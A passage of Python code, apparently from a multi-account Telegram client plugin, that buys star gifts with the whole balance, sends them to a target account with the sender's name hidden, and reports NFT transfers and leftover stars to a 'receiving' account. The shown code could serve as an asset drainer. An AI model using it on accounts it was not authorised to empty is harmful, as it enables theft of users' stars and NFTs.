            self._diag(slot, "🎁 нет класса getStarGifts")
            then()
            return
        try:
            creq.hash = 0
        except Exception:
            pass

        def on_cat(resp, err):
            if err is not None or resp is None:
                self._diag(slot, "🎁 каталог err: %s" % (getattr(err, "text", err) if err else "пусто"))
                then()
                return
            catalog = []
            try:
                for cg in self._jlist(getattr(resp, "gifts", None)):
                    gid = getattr(cg, "id", None)
                    price = getattr(cg, "stars", None)
                    sold_out = getattr(cg, "sold_out", False)
                    limited = getattr(cg, "limited", False)
                    if gid is not None and price and not sold_out:
                        catalog.append((int(price), gid, limited))
            except Exception as e:
                self._diag(slot, "🎁 разбор каталога err: %s" % e)
            # самые дорогие сначала — меньше транзакций, эффективнее переносим звёзды
            catalog.sort(reverse=True)
            state.setdefault("gifted", 0)
            state.setdefault("gifted_stars", 0)

            def send_next():
                try:
                    bal = self._stars_balance(slot) or 0
                except Exception:
                    bal = 0
                pick = None
                for price, gid, limited in catalog:
                    if price <= bal:
                        pick = (price, gid)
                        break
                if pick is None:
                    self._diag(slot, "🎁 Отправлено подарков: %d (на %d⭐), осталось ~%d⭐" % (
                        state["gifted"], state["gifted_stars"], bal))
                    then()
                    return
                price, gid = pick

                def after(err):
                    if err is None:
                        state["gifted"] += 1
                        state["gifted_stars"] += price
                    else:
                        self._diag(slot, "🎁 подарок err: %s" % err)
                        then()
                        return
                    send_next()

                self._send_star_gift(slot, to_id, gid, after)

            send_next()

        self._send_request(slot, creq, on_cat)

    def _send_star_gift(self, slot, to_id, gift_id, cb):
        inv = self._new_tl([(TL_stars, "TL_inputInvoiceStarGift"),
                            (TLRPC, "TL_inputInvoiceStarGift"),
                            (TL_payments, "TL_inputInvoiceStarGift")])
        if inv is None:
            cb("нет класса inputInvoiceStarGift")
            return
        try:
            inv.peer = to_id
            inv.gift_id = gift_id
            try:
                inv.hide_name = True
            except Exception:
                pass
        except Exception as e:
            cb("invoice gift fill err %s" % e)
            return

        freq = self._new_tl([(TL_payments, "getPaymentForm"),
                            (TL_payments, "TL_payments_getPaymentForm"),
                            (TLRPC, "TL_payments_getPaymentForm")])
        if freq is None:
            cb("нет класса getPaymentForm")
            return
        try:
            freq.invoice = inv
        except Exception as e:
            cb("form set err %s" % e)
            return

        def on_form(resp, err):
            if err is not None:
                cb(str(getattr(err, "text", err)))
                return
            form_id = getattr(resp, "form_id", None)
            if form_id is None:
                cb("нет form_id")
                return
            sreq = self._new_tl([(TL_payments, "sendStarsForm"),
                                (TL_payments, "TL_payments_sendStarsForm"),
                                (TLRPC, "TL_payments_sendStarsForm")])
            if sreq is None:
                cb("нет класса sendStarsForm")
                return
            try:
                sreq.form_id = form_id
                sreq.invoice = inv
            except Exception as e:
                cb("sendForm fill err %s" % e)
                return

            def on_send(resp2, err2):
                cb(str(getattr(err2, "text", err2)) if err2 is not None else None)
            self._send_request(slot, sreq, on_send)

        self._send_request(slot, freq, on_form)

    def _tsummary(self, slot, target_id, ok, kd, no_stars, errs, state, meta, total):
        def link(g):
            return ("https://t.me/nft/%s" % g["slug"]) if g.get("slug") else "—"

        def label(g):
            return ("%s #%s" % (g["title"], g["num"])) if g.get("num") is not None else g["title"]

        not_sent = len(kd) + len(no_stars) + len(errs)

        lines = ["📋 ИТОГ — аккаунт #%d" % (slot + 1), ""]
        if state.get("conv_ok") or state.get("conv_err"):
            lines.append("🔄 Обменяно подарков: %d (+%d⭐), ошибок: %d" % (
                state["conv_ok"], state["conv_stars"], state["conv_err"]))
        lines.append("✅ Отправлено NFT: %d из %d" % (len(ok), total))
        lines.append("⛔ Не отправлено: %d" % not_sent)
        lines.append("⭐ Потрачено на перенос: %d" % state["spent"])
        if state.get("listed"):
            lines.append("🏪 Выставлено на продажу: %d" % state["listed"])
        if state.get("gifted"):
            lines.append("🎁 Отправлено звёзд подарками: %d шт на %d⭐" % (
                state["gifted"], state.get("gifted_stars", 0)))
        lines.append("💰 Осталось звёзд: %d" % state["bal"])

        if not self.get_setting("short_log", False):
            lines.append("")
            if ok:
                lines.append("✅ Успешно:")
                for g in ok[:60]:
                    lines.append("• %s — %s (%d⭐)" % (label(g), link(g), g["cost"]))
                lines.append("")
            if kd:
                lines.append("🔒 В КД (не время переноса):")
                for g in kd[:60]:
                    try:
                        until = datetime.datetime.utcfromtimestamp(int(g["cat"])).strftime("%Y-%m-%d %H:%M")
                    except Exception:
                        until = "?"
                    lines.append("• %s — до %s" % (label(g), until))
                lines.append("")
            if no_stars:
                lines.append("⚠️ Не хватило звёзд:")
                for g in no_stars[:60]:
                    lines.append("• %s — нужно %d⭐" % (label(g), g["cost"]))
                lines.append("")
            if errs:
                lines.append("❌ Ошибки:")
                for g, e in errs[:60]:
                    lines.append("• %s — %s" % (label(g), e))
                if meta and meta.get("fields"):
                    lines.append("")
                    lines.append("🔧 поля подарка: %s" % meta["fields"])

        text = "\n".join(lines)
        # полный итог — на основной (принимающий) аккаунт
        if target_id:
            self._send_text(slot, target_id, text)
        else:
            self._diag(slot, text)

    def _send_text(self, slot, dialog_id, text):
        if SendMessageParams is None:
            self._debug("Нет SendMessageParams — отправка невозможна")
            return

        def do():
            try:
                params = SendMessageParams.of(text, dialog_id)
                SendMessagesHelper.getInstance(slot).sendMessage(params)
                self._debug("✅ отправлено (slot %d)" % slot)
            except Exception as e:
                self._debug("send err slot %d: %s: %s" % (slot, type(e).__name__, e))
        run_on_ui_thread(do)
